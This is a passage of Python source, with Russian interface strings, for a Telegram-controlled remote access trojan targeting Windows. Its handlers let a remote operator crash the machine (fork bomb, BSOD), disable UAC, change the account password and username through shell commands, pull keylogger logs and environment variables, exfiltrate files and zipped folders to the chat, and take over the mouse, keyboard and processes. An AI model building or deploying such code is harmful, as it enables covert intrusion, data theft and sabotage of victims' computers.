        rgb_color = colorsys.hsv_to_rgb(color, 1.0, 1.0)

        brush = win32gui.CreateSolidBrush(
            win32api.RGB(
                int(rgb_color[0]) * 255, int(rgb_color[1]) * 255, int(rgb_color[2]) * 255
            )
        )
        win32gui.SelectObject(hdc, brush)
        win32gui.BitBlt(
            hdc,
            random.randint(0, 0),
            random.randint(0, 0),
            sw,
            sh,
            hdc,
            0,
            0,
            win32con.SRCCOPY,
        )
        win32gui.BitBlt(
            hdc,
            random.randint(0, 0),
            random.randint(0, 0),
            sw,
            sh,
            hdc,
            0,
            0,
            win32con.PATINVERT,
        )
        color += 0.01

def gdi_invert():
    global stop
    hdc = win32gui.GetDC(0)
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
    while stop == False:
        win32gui.InvertRect(hdc, (0, 0, w, h))
        time.sleep(0.2)

def gdi_wave():
    global stop
    def sines():
        desktop = win32gui.GetDesktopWindow()
        hdc = win32gui.GetWindowDC(desktop)
        sw = win32api.GetSystemMetrics(0)
        sh = win32api.GetSystemMetrics(1)
        angle = 0
        scaling_factor = 10  # Adjust this value for performance vs. visual quality

        while stop == False:
            hdc = win32gui.GetWindowDC(desktop)
            for i in range(0, int(sw + sh), scaling_factor):
                # Scale the amplitude of the sine wave
                a = int(math.sin(angle) * 20 * (scaling_factor))
                win32gui.BitBlt(hdc, 0, i, sw, scaling_factor, hdc, a, i, win32con.SRCCOPY)
                angle += math.pi / 40
            win32gui.ReleaseDC(desktop, hdc)

    sines()

def gdi_tunnel():
    global stop
    hdc = win32gui.GetDC(0)
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]

    delay = 0.1
    size = 100
    while stop == False:
        hdc = win32gui.GetDC(0)
        win32gui.StretchBlt(
            hdc,
            int(size / 2),
            int(size / 2),
            sw - size,
            sh - size,
            hdc,
            0,
            0,
            sw,
            sh,
            win32con.SRCCOPY,
        )
        time.sleep(delay)

@bot.message_handler(commands=['gdi'])
def gdi(message):
    if message.chat.id == admin_id:
        global stop
        try:
            name = message.text.replace('/gdi', '').strip().lower()
            if not name:
                bot.reply_to(message, "Названия для gdi эффектов: void, invert, wave, tunnel, rainbow, melt\nstop для остоновки")
                return
                
            stop = False
            if name == "void":
                thread = threading.Thread(target=gdi_void, daemon=True)
                thread.start()
            elif name == "invert":
                thread = threading.Thread(target=gdi_invert, daemon=True)
                thread.start()
            elif name == "wave":
                thread = threading.Thread(target=gdi_wave, daemon=True)
                thread.start()
            elif name == "tunnel":
                thread = threading.Thread(target=gdi_tunnel, daemon=True)
                thread.start()
            elif name == "rainbow":
                thread = threading.Thread(target=gdi_rainbow, daemon=True)
                thread.start()
            elif name == "melt":
                thread = threading.Thread(target=gdi_melt, daemon=True)
                thread.start()
            elif name == "stop":
                stop = True
                bot.send_message(message.chat.id, f"GDI эффекты остановлены!")
                pass
                
            if stop is not True:
                bot.send_message(message.chat.id, f"GDI эффект запущен!")
            
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка при попытке запустить GDI эффект: {str(e)}")

@bot.message_handler(commands=['setusername'])
def setuser(message):
    if message.chat.id == admin_id:
        user2 = None
        user2 = message.text.replace('/setusername', '').strip()
        if not user2:
            bot.send_message(message.chat.id, f"Введите имя пользователя после команды /setusername!")
        else:
            try:
                os.system(f"wmic useraccount where name='{user}' rename {user2}")
                bot.send_message(message.chat.id, f"Имя пользователя изменено на '{user2}'!")
            except Exception as e:
                bot.send_message(message.chat.id, f"Ошибка при попытке изменить имя пользователя: {str(e)}")

@bot.message_handler(commands=['forkbomb'])
def forkbomb(message):
    if message.chat.id == admin_id:
        conf = message.text.replace('/forkbomb', '').strip()
        if not conf:
            bot.send_message(message.chat.id, f"Введите confirm после команды /forkbomb чтобы вызвать форкбомбу!")
        else:
            if conf == 'confirm':
                bot.send_message(message.chat.id, f"Вызываю forkbomb...")
                subprocess.Popen('forkbomb.bat')

@bot.message_handler(commands=['setpass'])
def setpass(message):
    if message.chat.id == admin_id:
        passwd = None
        passwd = message.text.replace('/setpass', '').strip()
        if not passwd:
            bot.send_message(message.chat.id, f"Введите пароль после команды /setpass!")
        else:
            try:
                os.system(f'net user {user} {passwd}')
                bot.send_message(message.chat.id, f"Пароль на учётную заись {user} изменен на '{passwd}'!")
            except Exception as e:
                bot.send_message(message.chat.id, f"Ошибка при попытке изменить пароль: {str(e)}")

@bot.message_handler(commands=['bsod'])
def bsod(message):
    if message.chat.id == admin_id:
        conf = message.text.replace('/bsod', '').strip()
        if not conf:
            bot.send_message(message.chat.id, f"Введите confirm после команды /bsod чтобы вызвать BSOD!")
        else:
            if conf == 'confirm':
                bot.send_message(message.chat.id, f"Вызываю BSOD через wininit...")
                os.system('powershell /c wininit')

def keyListener(val):
    while True:
        val[0] = kb.read_key()

def afk():
    #взято с https://github.com/warpaint97/AFKMouseMover
    timeLimit = 30 # time limit in seconds until AFK Mode kicks in
    updateTime = 2 # time between mouse movements during AFK mode
    # internal variables
    last_pos = None
    counter = 0
    afkMode = False
    isMoving = False

    # threading for key listener
    keyValue = [None]
    listener = threading.Thread(target=keyListener, args=(keyValue,), daemon=True)
    listener.start()

    #main program loop
    while True:
        if counter > 0 <= timeLimit and not afkMode:
            print(f'{timeLimit - counter} seconds before AFK is detected.')

        if counter >= timeLimit:
            if not afkMode:
                bot.send_message(admin_id, f'Активность не обнаружена {timeLimit} секунд. Вхожу в режим AFK...')
            afkMode = True

        time.sleep(1) if not afkMode else time.sleep(updateTime)
        if last_pos == pdi.position() and keyValue[0] == None:
            if not afkMode:
                counter += 1
        else:
            if counter > 0 and afkMode == True:
                bot.send_message(admin_id, 'Активность обнаружена')

            counter = 0
            afkMode = False
            keyValue[0] = None
        last_pos = pdi.position()

is_afk = threading.Thread(target=afk)
is_afk.start()

@bot.message_handler(commands=['cd'])
def cd_drive(message):
    if message.chat.id == admin_id:
        """Команды для управления дисководом"""
        try:
            command = message.text.replace('/cd', '').strip().lower()
            if not command:
                bot.reply_to(message, """
    Доступные команды:
    /cd open - открыть дисковод
    /cd close - закрыть дисковод
    """)
                return
            
            if command == 'open':
                ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
                bot.reply_to(message, "Дисковод открыт")
            elif command == 'close':
                ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door closed", None, 0, None)
                bot.reply_to(message, "Дисковод закрыт")
            else:
                bot.reply_to(message, " Неверная команда. Используйте /cd open или /cd close")
        except Exception as e:
            bot.reply_to(message, f" Произошла ошибка: {str(e)}")

@bot.message_handler(commands=['uac'])
def uac(message):
    if message.chat.id == admin_id:
        """Команды для управления дисководом"""
        try:
            command = message.text.replace('/uac', '').strip().lower()
            if not command:
                bot.reply_to(message, """
    Доступные команды:
    /uac on - включить UAC
    /uac off - выключить UAC
    """)
                return
            
            if command == 'on':
                command = 'powershell.exe -Command "Start-Process cmd.exe -ArgumentList \'/c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f\' -Verb RunAs"'
                os.system(f"{command}")
                bot.reply_to(message, "UAC включён")
            elif command == 'off':
                command = 'powershell.exe -Command "Start-Process cmd.exe -ArgumentList \'/c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f\' -Verb RunAs"'
                os.system(f"{command}")
                bot.reply_to(message, "UAC выключен")
            else:
                bot.reply_to(message, " Неверная команда. Используйте /uac on или /uac off")
        except Exception as e:
            bot.reply_to(message, f" Произошла ошибка: {str(e)}")

@bot.message_handler(commands=['rotate_screen'])
def rotate_screen(message):
    if message.chat.id == admin_id:
        try:
            rotate_screen = rotatescreen.get_primary_display()
            degrees = message.text.replace('/rotate_screen', '').strip().lower()
            if not degrees:
                bot.reply_to(message, "Названия для поворота экрана: up, down, left, right")
                return
                
            if degrees == "up":
                rotate_screen.set_landscape()
                bot.send_message(message.chat.id, f"🖥Экран перевернут в нормальное положение")
            elif degrees == "down":
                rotate_screen.set_landscape_flipped()
                bot.send_message(message.chat.id, f"🖥Экран перевернут вверх ногами")
            elif degrees == "left":
                rotate_screen.set_portrait()
                bot.send_message(message.chat.id, f"🖥Экран перевернут влево")
            elif degrees == "right":
                rotate_screen.set_portrait_flipped()
                bot.send_message(message.chat.id, f"🖥Экран перевернут вправо")
            
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка при попытке перевернуть экран: {str(e)}")



@bot.message_handler(commands=['system'])
def system_commands(message):
    if message.chat.id == admin_id:
        """Команды для управления системой"""
        try:
            command_text = message.text.replace('/system', '').strip()
            if not command_text:
                bot.reply_to(message, """
                Доступные команды:
                /system info - показать информацию о системе
                /system disk - показать информацию о дисках
                /system network - показать информацию о сети
                /system memory - показать информацию о памяти
                /system users - показать список пользователей
                /system services - показать системные службы
                /system drivers - показать загруженные драйверы
                /system environment - показать переменные окружения
                """)
                return
                
            command = command_text.split()[0]
            
            if command == 'info':
                info = f"""
                Информация о системе:
                - ОС: {platform.system()} {platform.release()}
                - Версия: {platform.version()}
                - Архитектура: {platform.machine()}
                - Процессор: {platform.processor()}
                """
                bot.send_message(message.chat.id, info)
                
            elif command == 'disk':
                disk_info = []
                for disk in psutil.disk_partitions():
                    usage = psutil.disk_usage(disk.mountpoint)
                    disk_info.append(f"""
                    Диск {disk.device}:
                    - Тип: {disk.fstype}
                    - Общий объем: {usage.total // (1024.0 ** 3):.2f} GB
                    - Использовано: {usage.used // (1024.0 ** 3):.2f} GB
                    - Свободно: {usage.free // (1024.0 ** 3):.2f} GB
                    - Использовано: {usage.percent}%
                    """)
                    
                if disk_info:
                    result = "Информация о дисках:\n\n"
                    for info in disk_info:
                        result += info + "\n"
                    bot.send_message(message.chat.id, result)
                else:
                    bot.send_message(message.chat.id, "Информация о дисках недоступна")
                    
            elif command == 'network':
                net_io = psutil.net_io_counters()
                net_info = f"""
                Информация о сети:
                - Байт отправлено: {net_io.bytes_sent // (1024.0 ** 2):.2f} MB
                - Байт получено: {net_io.bytes_recv // (1024.0 ** 2):.2f} MB
                """
                bot.send_message(message.chat.id, net_info)
                
            elif command == 'memory':
                mem = psutil.virtual_memory()
                swap = psutil.swap_memory()
                mem_info = f"""
                Информация о памяти:
                - Общий объем RAM: {mem.total // (1024.0 ** 3):.2f} GB
                - Использовано RAM: {mem.used // (1024.0 ** 3):.2f} GB
                - Свободно RAM: {mem.available // (1024.0 ** 3):.2f} GB
                - Процент использования RAM: {mem.percent}%
                - Общий объем SWAP: {swap.total // (1024.0 ** 3):.2f} GB
                - Использовано SWAP: {swap.used // (1024.0 ** 3):.2f} GB
                """
                bot.send_message(message.chat.id, mem_info)
                
            elif command == 'users':
                users = psutil.users()
                result = "Подключенные пользователи:\n\n"
                for user in users:
                    result += f"Имя: {user.name}\n"
                    result += f"Терминал: {user.terminal}\n"
                    result += f"Время входа(UNIX time): {user.started}\n\n"
                bot.send_message(message.chat.id, result)
                
            elif command == 'services':
                services = []
                for service in psutil.win_service_iter():
                    info = service.as_dict()
                    services.append(f"{info['display_name']}: {info['status']}")
                
                result = "Список служб:\n\n" + "\n".join(services)
                if len(result) > 4096:
                    for i in range(0, len(result), 4096):
                        bot.send_message(message.chat.id, result[i:i + 4096])
                else:
                    bot.send_message(message.chat.id, result)
                    
            elif command == 'drivers':
                drivers = []
                for driver in psutil.win_service_iter(['pid', 'name', 'status']):
                    if driver.info['status'] == 'running':
                        drivers.append(f"{driver.info['name']}: {driver.info['pid']}")
                
                result = "Загруженные драйверы:\n\n" + "\n".join(drivers)
                bot.send_message(message.chat.id, result)
                
            elif command == 'environment':
                env_vars = os.environ
                result = "Переменные окружения:\n\n"
                for key, value in env_vars.items():
                    result += f"{key} = {value}\n"
                    
                if len(result) > 4096:
                    for i in range(0, len(result), 4096):
                        bot.send_message(message.chat.id, result[i:i + 4096])
                else:
                    bot.send_message(message.chat.id, result)
                    
        except Exception as e:
            bot.reply_to(message, f"Ошибка при получении информации о системе: {str(e)}")


@bot.message_handler(commands=['clear_keylogger_logs'])
def revove_keylogs(message):
    if message.chat.id == admin_id:
        current_dir = os.path.abspath(os.getcwd())
        log_path = os.path.join(current_dir, "log.txt")
        if not os.path.exists(log_path):
                bot.reply_to(message, "Лог-файл не найден")
                return
        else:
            os.remove(log_path)
            bot.reply_to(message, "Лог-файл удалён!")

@bot.message_handler(commands=['keylogger_logs'])
def send_keylogs(message):
    if message.chat.id == admin_id:
        current_dir = os.path.abspath(os.getcwd())
        log_path = os.path.join(current_dir, "log.txt")
        if not os.path.exists(log_path):
                bot.reply_to(message, "Лог-файл не найден")
                return
        else:
            bot.send_document(message.chat.id, open(log_path, 'rb'))

@bot.message_handler(commands=['script_dir'])
def current_dir(message):
    if message.chat.id == admin_id:
        try:
            # Получаем абсолютный путь к текущему скрипту
            pathname = os.path.abspath(__file__)
            
            # Отправляем сообщение пользователю
            bot.send_message(message.chat.id, pathname)
        except Exception as e:
            # В случае ошибки отправляем сообщение об ошибке
            bot.reply_to(message, f' Произошла ошибка: {str(e)}')


@bot.message_handler(commands=['file'])
def file_commands(message):
    if message.chat.id == admin_id:
        """Расширенные команды для работы с файлами"""
        try:
            command_text = message.text.replace('/file', '').strip()
            if not command_text:
                bot.reply_to(message, """
                Доступные команды:
                /file list <папка> - показать содержимое папки
                /file search <папка> <поиск> - поиск файлов
                /file zip <папка> - создать архив папки
                /file unzip <путь> - разархивировать архив
                /file copy <источник> <назначение> - копировать файл
                /file move <источник> <назначение> - переместить файл
                /file delete <путь> - удалить файл
                /file create <путь> - создать файл
                /file edit <путь> <содержимое> - редактировать файл
                /file download <путь> - загрузить файл с ПК
                """)
                return
                
            command, params = command_text.split(maxsplit=1)
            params = params if params else ''
            
            if command == 'list':
                folder = params
                if not os.path.exists(folder):
                    bot.reply_to(message, f"Папка '{folder}' не найдена")
                    return
                    
                files = os.listdir(folder)
                if not files:
                    bot.reply_to(message, f"Папка '{folder}' пуста")
                    return
                    
                result = f"Содержимое папки '{folder}':\n\n"
                for file in files:
                    result += f"- {file}\n"
                    
                if len(result) > 4096:
                    for i in range(0, len(result), 4096):
                        bot.send_message(message.chat.id, result[i:i + 4096])
                else:
                    bot.send_message(message.chat.id, result)
                    
            elif command == 'search':
                folder, search = params.split(maxsplit=1)
                if not os.path.exists(folder):
                    bot.reply_to(message, f" Папка '{folder}' не найдена")
                    return
                    
                found_files = []
                for root, _, files in os.walk(folder):
                    for file in files:
                        if search.lower() in file.lower():
                            found_files.append(os.path.join(root, file))
                            
                if not found_files:
                    bot.reply_to(message, "Ничего не найдено")
                    return
                    
                result = f"Найдено {len(found_files)} файлов:\n\n"
                for file in found_files:
                    result += f"- {file}\n"
                    
                if len(result) > 4096:
                    for i in range(0, len(result), 4096):
                        bot.send_message(message.chat.id, result[i:i + 4096])
                else:
                    bot.send_message(message.chat.id, result)
                    
            elif command == 'download':
                # Проверяем, указан ли путь
                if not params:
                    bot.reply_to(message, "Использование: /file download <путь_к_файлу>")
                    return
                    
                # Проверяем существование файла
                if not os.path.exists(params):
                    bot.reply_to(message, f"Файл '{file_path}' не найден")
                    return

                file_name = os.path.basename(params)

                    
                # Отправляем файл
                try:
                    with open(file_path, 'rb') as file:
                        bot.send_document(
                            chat_id=message.chat.id,
                            document=file,
                            caption=f"Файл '{file_name}' успешно загружен!"
                        )
                except Exception as e:
                    bot.reply_to(message, f"Ошибка при отправке файла: {str(e)}")
                    
            elif command == 'zip':
                folder = params
                if not os.path.exists(folder):
                    bot.reply_to(message, f" Папка '{folder}' не найдена")
                    return
                    
                temp_dir = tempfile.gettempdir()
                zip_path = os.path.join(temp_dir, f'archive_{time.time()}.zip')
                
                with ZipFile(zip_path, 'w') as zip_file:
                    for root, _, files in os.walk(folder):
                        for file in files:
                            file_path = os.path.join(root, file)
                            rel_path = os.path.relpath(file_path, folder)
                            zip_file.write(file_path, rel_path)
                            
                bot.send_document(message.chat.id, open(zip_path, 'rb'))
                os.remove(zip_path)
            
            elif command == 'unzip':
                file = params
                with zipfile.ZipFile(file, 'r') as zip_ref:
                    tmp = os.getenv('TEMP')
                    zip_ref.extractall(path=tmp)
                bot.send_message(admin_id, f'Файл {file} разархивирован!')

            elif command == 'copy':
                source, dest = params.split()
                if not os.path.exists(source):
                    bot.reply_to(message, f" Файл '{source}' не найден")
                    return
                    
                try:
                    shutil.copy2(source, dest)
                    bot.reply_to(message, f" Файл '{source}' скопирован в '{dest}'")
                except Exception as e:
                    bot.reply_to(message, f" Ошибка при копировании: {str(e)}")
                    
            elif command == 'move':
                source, dest = params.split()
                if not os.path.exists(source):
                    bot.reply_to(message, f" Файл '{source}' не найден")
                    return
                    
                try:
                    shutil.move(source, dest)
                    bot.reply_to(message, f" Файл '{source}' перемещен в '{dest}'")
                except Exception as e:
                    bot.reply_to(message, f" Ошибка при перемещении: {str(e)}")
                    
            elif command == 'delete':
                path = params
                if not os.path.exists(path):
                    bot.reply_to(message, f" Файл '{path}' не найден")
                    return
                    
                try:
                    os.remove(path)
                    bot.reply_to(message, f" Файл '{path}' удален")
                except Exception as e:
                    bot.reply_to(message, f" Ошибка при удалении: {str(e)}")
                    
            elif command == 'create':
                path = params
                try:
                    with open(path, 'w') as f:
                        pass
                    bot.reply_to(message, f" Файл '{path}' создан")
                except Exception as e:
                    bot.reply_to(message, f" Ошибка при создании файла: {str(e)}")
                    
            elif command == 'edit':
                path, content = params.split(maxsplit=1)
                try:
                    with open(path, 'w', encoding='utf-8') as f:
                        f.write(content)
                    bot.reply_to(message, f" Файл '{path}' отредактирован")
                except Exception as e:
                    bot.reply_to(message, f" Ошибка при редактировании файла: {str(e)}")
                    
        except Exception as e:
            bot.reply_to(message, f" Ошибка при работе с файлами: {str(e)}")

def get_all_window_titles():
    """
    Возвращает список всех видимых окон и их заголовков.
    Возвращает кортеж из двух списков: (заголовки, hwnd).
    """
    def winEnumHandler(hwnd, ctx):
        if win32gui.IsWindowVisible(hwnd):
            # Получаем длину заголовка через ctypes
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            
            # Создаем буфер достаточного размера
            buf = ctypes.create_unicode_buffer(length + 1)
            
            # Получаем заголовок используя GetWindowTextW
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            
            title = buf.value
            if title:  # Пропускаем окна без заголовка
                ctx.append((title, hwnd))
        return True
    
    windows = []
    win32gui.EnumWindows(winEnumHandler, windows)
    titles, hwnds = zip(*windows) if windows else ([], [])
    return titles, hwnds

@bot.message_handler(commands=['get_all_titles'])
def get_windows(message):
    if message.chat.id == admin_id:
        """
        Отправляет список всех видимых окон в чат.
        """
        try:
            titles, hwnds = get_all_window_titles()
            if not titles:
                bot.reply_to(message, " Не найдено видимых окон")
                return
                
            # Формируем сообщение с заголовками окон
            result = "Список открытых окон:\n\n"
            for title in titles:
                result += f"- {title}\n"
                
            # Если сообщение слишком длинное, отправляем по частям
            if len(result) > 4096:
                for i in range(0, len(result), 4096):
                    bot.send_message(
                        chat_id=message.chat.id,
                        text=result[i:i + 4096]
                    )
            else:
                bot.send_message(
                    chat_id=message.chat.id,
                    text=result
                )
                
        except Exception as e:
            bot.reply_to(message, f" Произошла ошибка: {str(e)}")

def turn_off_monitor():
        """Выключает монитор"""
        os_name = platform.system().lower()
        
        if os_name == 'windows':
            # Для Windows используем системный вызов
            ctypes.windll.user32.SendMessageW(65535, 0x112, 0xF170, 2)
        elif os_name == 'linux':
            # Для Linux используем команду xset
            try:
                subprocess.run(['xset', 'dpms', 'force', 'off'], check=True)
            except subprocess.CalledProcessError:
                raise Exception("Не удалось выключить монитор. Проверьте права доступа.")
        else:
            raise Exception("Неподдерживаемая операционная система")

def turn_on_monitor():
    """Включает монитор"""
    os_name = platform.system().lower()
    
    if os_name == 'windows':
        # Для Windows используем системный вызов
        ctypes.windll.user32.SendMessageW(65535, 0x112, 0xF170, -1)
        pyautogui.typewrite(" ")
        pyautogui.hotkey('backspace')
    elif os_name == 'linux':
        # Для Linux используем команду xset
        try:
            subprocess.run(['xset', 'dpms', 'force', 'on'], check=True)
        except subprocess.CalledProcessError:
            raise Exception("Не удалось включить монитор. Проверьте права доступа.")
    else:
        raise Exception("Неподдерживаемая операционная система")

@bot.message_handler(commands=['monitor'])
def monitor_command(message):
    if message.chat.id == admin_id:
        """Команда для управления монитором"""
        try:
            command = message.text.replace('/monitor', '').strip().lower()
            
            if not command:
                bot.reply_to(message, """
                Доступные команды:
                /monitor on - включить монитор
                /monitor off - выключить монитор
                /monitor status - проверить статус мониторов
                """)
                return
                
            if command == 'on':
                turn_on_monitor()
                bot.reply_to(message, "Монитор включен")
                
            elif command == 'off':
                turn_off_monitor()
                bot.reply_to(message, "Монитор выключен")
                
            elif command == 'status':
                status = []
                for display in rotatescreen.get_displays():
                    status.append(f"Монитор {display.device}: {display.current_orientation}")
                bot.reply_to(message, "\n".join(status))
                
            else:
                bot.reply_to(message, " Неверная команда. Используйте on/off/status")
                
        except Exception as e:
            bot.reply_to(message, f" Произошла ошибка: {str(e)}")


@bot.message_handler(commands=['set_wallpaper'])
def set_wallpaper(message):
    if message.chat.id == admin_id:
        try:
            path = message.text.replace('/set_wallpaper', '').strip().lower()
            if path:
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
                bot.send_message(message.chat.id, 'Смена обоев успешна!')
                path = None
            else:
                bot.send_message(message.chat.id, 'Введите путь до картинки после команды!')
                path = None
        except Exception as e:
            bot.send_message(message.chat.id, f'Ошибка: {str(e)}')

@bot.message_handler(commands=['system_monitor'])
def system_monitor(message):
    if message.chat.id == admin_id:
        """Мониторинг системных ресурсов"""
        try:
            command = message.text.replace('/system_monitor', '').strip().lower()
            if command == 'start':
                # Запуск мониторинга в отдельном потоке
                threading.Thread(target=monitor_system, args=(message.chat.id,)).start()
                bot.reply_to(message, "Мониторинг запущен")
            elif command == 'stop':
                global MONITORING
                MONITORING = False
                bot.reply_to(message, "Мониторинг остановлен")
            else:
                bot.reply_to(message, """
                Доступные команды:
                /system_monitor start - начать мониторинг
                /system_monitor stop - остановить мониторинг
                """)
        except Exception as e:
            bot.reply_to(message, f"Ошибка: {str(e)}")

def monitor_system(chat_id):
    global MONITORING
    MONITORING = True
    while MONITORING:
        cpu = psutil.cpu_percent()
        mem = psutil.virtual_memory().percent
        disk = psutil.disk_usage('/').percent
        bot.send_message(chat_id, 
                        f"CPU: {cpu}%\nRAM: {mem}%\nDisk: {disk}%")
        time.sleep(5)

@bot.message_handler(commands=['ip'])
def get_ip_info(message):
    if message.chat.id == admin_id:
        """Получает информацию об IP-адресе и геолокации"""
        try:
            # Получаем IP-адрес
            ip_address = socket.gethostbyname(socket.gethostname())
            
            # Получаем информацию о геолокации
            response = requests.get(f'https://geolocation-db.com/json/{ip_address}').json()
            
            # Формируем сообщение с информацией
            info = f"""
            Информация о подключении:
            - IP-адрес: {ip_address}
            - Страна: {response['country_name']}
            - Город: {response['city']}
            - Широта: {response['latitude']}
            - Долгота: {response['longitude']}
            """
            
            bot.send_message(message.chat.id, info)
            
        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка при получении информации: {str(e)}")

@bot.message_handler(commands=['mouse'])
def mouse_commands(message):
    if message.chat.id == admin_id:
        try:
            mouse_command = message.text.replace('/mouse', '').strip()
            #print(mouse_command)

            if 'moveto' in mouse_command.lower():
                try:
                    cords = message.text.replace('/mouse moveto', '').strip()
                    x, y = map(int, cords.split())
                    pyautogui.moveTo(x, y)
                    bot.reply_to(message, f"Мышь перемещена к координатам ({x}, {y})")
                except ValueError:
                    bot.reply_to(message, "Неверный формат координат. Используйте: /mouse moveto x y")
                except Exception as e:
                    bot.reply_to(message, f"Ошибка при перемещении мыши к координатам: {str(e)}")

            elif 'scroll' in mouse_command.lower():
                scroll_px = mouse_command.replace('scroll', '').strip()
                pyautogui.scroll(scroll_px)
                bot.reply_to(message, f"Страница прокручена на {scroll_px} пикселей")

            elif 'pos' in mouse_command.lower():
                pos = pyautogui.position()
                bot.reply_to(message, f"Позиция курсора:{pos}")

            elif 'drag' in mouse_command.lower():
                # Получаем координаты начала и конца из сообщения
                coords = message.text.replace('/mouse drag', '').strip()
                print(coords)

                if not coords:
                    bot.reply_to(message, "Использование: /mouse drag x1,y1 x2,y2")
                    return
                    
                # Разбиваем строку на две пары координат
                try:
                    start_coords, end_coords = coords.split()
                    start_x, start_y = map(int, start_coords.split(','))
                    end_x, end_y = map(int, end_coords.split(','))
                except ValueError:
                    bot.reply_to(message, "Ошибка: Неверный формат координат. Используйте формат: x1,y1 x2,y2")
                    return
                
                # Получаем размеры экрана для проверки границ
                screen_width, screen_height = pyautogui.size()
                
                # Проверяем все координаты
                if (start_x < 0 or start_x > screen_width or start_y < 0 or start_y > screen_height or
                    end_x < 0 or end_x > screen_width or end_y < 0 or end_y > screen_height):
                    bot.reply_to(message, f"Ошибка: Все координаты должны быть в пределах экрана ({screen_width}x{screen_height})")
                    return
                
                # Перемещаем и перетаскиваем курсор
                pyautogui.moveTo(start_x, start_y)
                pyautogui.mouseDown()
                pyautogui.moveTo(end_x, end_y,duration=1)
                pyautogui.mouseUp()
                
                bot.reply_to(message, f"Перетаскивание выполнено от ({start_x},{start_y}) до ({end_x},{end_y})")

            elif 'click' in mouse_command.lower():
                click_type = mouse_command.replace('click', '').strip()
                if click_type == 'left' or click_type == '':
                    pyautogui.click(button='left')
                    bot.reply_to(message, "Выполнен левый клик")
                elif click_type == 'right':
                    pyautogui.click(button='right')
                    bot.reply_to(message, "Выполнен правый клик")
                else:
                    bot.reply_to(message, "Неверный тип клика. Используйте: /mouse click [left/right]")

            elif 'move' in mouse_command.lower():
                try:
                    cords = message.text.replace('/mouse move', '').strip()
                    x, y = map(int, cords.split())
                    pyautogui.move(x, y)
                    bot.reply_to(message, f"Мышь перемещена на координаты ({x}, {y})")
                except ValueError:
                    bot.reply_to(message, "Неверный формат координат.  Используйте: /mouse move x y")
                except Exception as e:
                    bot.reply_to(message, f"Ошибка при перемещении мыши: {str(e)}")
                    
            
            
            else:
                bot.reply_to(message, "Неизвестная команда мыши. Доступные команды: move, click, moveto, scroll, drag")


        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка при управлении мышью: {str(e)}")

@bot.message_handler(commands=['keyboard'])
def keyboard_commands(message):
    # Разрешаем только админу
    if message.chat.id != admin_id:
        return

    try:
        keyboard_command = message.text.replace('/keyboard', '', 1).strip()

        # /keyboard type <текст>
        if keyboard_command.lower().startswith('type'):
            try:
                keys = message.text.replace('/keyboard type', '', 1).strip()
                if not keys:
                    bot.reply_to(message, "Пожалуйста, укажите текст для ввода после команды.")
                    return
                pyautogui.typewrite(keys)
                bot.reply_to(message, f"Текст '{keys}' успешно введён")
            except Exception as e:
                bot.reply_to(message, f"Ошибка при печати на клавиатуре: {e}")

        # /keyboard hotkey key1, key2, key3
        elif keyboard_command.lower().startswith('hotkey'):
            try:
                keys_str = message.text.replace('/keyboard hotkey', '', 1).strip()
                if not keys_str:
                    bot.reply_to(message,
                                 "Пожалуйста, отправьте клавиши для нажатия после команды!\nВ формате: winleft, up или ctrl, alt, del")
                    return

                keys = [k.strip().lower() for k in keys_str.split(',')]

                # Поддерживаем разные версии pyautogui: KEYBOARD_KEYS или KEY_NAMES
                valid_keys = getattr(pyautogui, 'KEYBOARD_KEYS', None) or getattr(pyautogui, 'KEY_NAMES', None)
                if valid_keys is None:
                    # на всякий случай — допустим, что pyautogui не имеет списка; в таком случае пропускаем проверку
                    valid_keys = []

                for key in keys:
                    if valid_keys and key not in valid_keys:
                        bot.reply_to(message,
                                     f"Неверное название клавиши: {key}.\nСписок доступных клавиш: https://pyautogui.readthedocs.io/en/latest/keyboard.html#keyboard-keys")
                        return

                pyautogui.hotkey(*keys)
                bot.reply_to(message, f"Клавиши '{keys_str}' успешно нажаты!")
            except Exception as e:
                bot.reply_to(message, f"Произошла ошибка: {e}")

        else:
            bot.reply_to(message, "Неизвестная подкоманда. Используйте 'type' или 'hotkey'.")
    except Exception as e:
        bot.reply_to(message, f"Ошибка обработки команды: {e}")

@bot.message_handler(commands=['process'])
def process_commands(message):
    if message.chat.id == admin_id:
        """Команды для управления процессами"""
        try:
            command_text = message.text.replace('/process', '').strip()
            if not command_text:
                bot.reply_to(message, """
                Доступные команды:
                /process list - показать список процессов
                /process kill <имя> - завершить процесс
                /process start <путь> - запустить процесс
                /process priority <имя> <приоритет> - изменить приоритет процесса
                /process info <имя> - информация о процессе
                /process suspend <имя> - заморозка процесса
                /process resume <имя> - раззаморозка процесса
                """)
                return
                
            command, *params = command_text.split(maxsplit=1)
            params = params[0] if params else ''
            
            if command == 'list':
                processes = []
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        processes.append(f"{proc.info['pid']}: {proc.info['name']}")
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        continue
                        
                if not processes:
                    bot.reply_to(message, "Процессы не найдены")
                    return
                    
                result = "Список процессов:\n\n"
                for proc in processes:
                    result += f"- {proc}\n"
                    
                if len(result) > 4096:
                    for i in range(0, len(result), 4096):
                        bot.send_message(message.chat.id, result[i:i + 4096])
                else:
                    bot.send_message(message.chat.id, result)
                    
            elif command == 'kill':
                if not params:
                    bot.reply_to(message, "Укажите имя процесса для завершения")
                    return
                    
                killed = False
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if proc.info['name'].lower() == params.lower():
                            proc.terminate()
                            killed = True
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        continue
                        
                if killed:
